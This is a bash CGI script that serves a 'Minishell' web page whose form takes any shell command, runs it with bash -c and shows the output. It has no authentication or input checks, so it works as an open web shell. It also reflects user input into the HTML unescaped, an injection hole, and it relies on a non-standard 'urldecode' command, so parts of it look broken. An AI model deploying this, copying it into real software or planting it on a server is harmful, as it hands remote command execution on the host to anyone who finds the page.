#!/bin/bash

echo "Content-Type: text/html"
echo ""
echo "<!DOCTYPE html>"
echo "<html>"
echo "<head>"
echo "    <title>Minishell CGI</title>"
echo "    <style>"
echo "        body { font-family: monospace; background: #1e1e1e; color: #00ff00; margin: 20px; }"
echo "        .container { max-width: 800px; margin: 0 auto; }"
echo "        .command-form { margin-bottom: 20px; }"
echo "        input[type='text'] { width: 70%; padding: 8px; background: #2d2d2d; color: #00ff00; border: 1px solid #444; }"
echo "        input[type='submit'] { padding: 8px 16px; background: #007acc; color: white; border: none; cursor: pointer; }"
echo "        .output { background: #2d2d2d; padding: 15px; border-radius: 5px; margin-top: 10px; white-space: pre-wrap; }"
echo "        .error { color: #ff5555; }"
echo "    </style>"
echo "</head>"
echo "<body>"
echo "    <div class='container'>"
echo "        <h1>🐚 Minishell CGI Interface</h1>"
echo "        <div class='command-form'>"
echo "            <form method='POST'>"
echo "                <input type='text' name='command' placeholder='Enter shell command...' value='$QUERY_STRING' required>"
echo "                <input type='submit' value='Execute'>"
echo "            </form>"
echo "        </div>"

# Check if we have a command to execute
if [ "$REQUEST_METHOD" = "POST" ]; then
    # Read POST data
    read -n $CONTENT_LENGTH POST_DATA
    
    # Extract command from POST data (format: command=ls+-la)
    COMMAND=$(echo "$POST_DATA" | sed 's/command=//' | sed 's/+/ /g' | urldecode)
    
    # Alternatively, for GET requests:
    # COMMAND=$(echo "$QUERY_STRING" | sed 's/command=//' | sed 's/+/ /g' | urldecode)
    
    if [ -n "$COMMAND" ]; then
        echo "        <h2>Command: <span style='color:#ff79c6'>$COMMAND</span></h2>"
        echo "        <div class='output'>"
        
        # Execute the command with timeout and capture output
        echo "=== Executing: $COMMAND ==="
        echo ""
        
        # Execute command with timeout to prevent hanging
        timeout 10s bash -c "$COMMAND" 2>&1
        
        EXIT_CODE=$?
        echo ""
        echo "=== Exit code: $EXIT_CODE ==="
        
        echo "        </div>"
    fi
fi

echo "    </div>"
echo "</body>"
echo "</html>"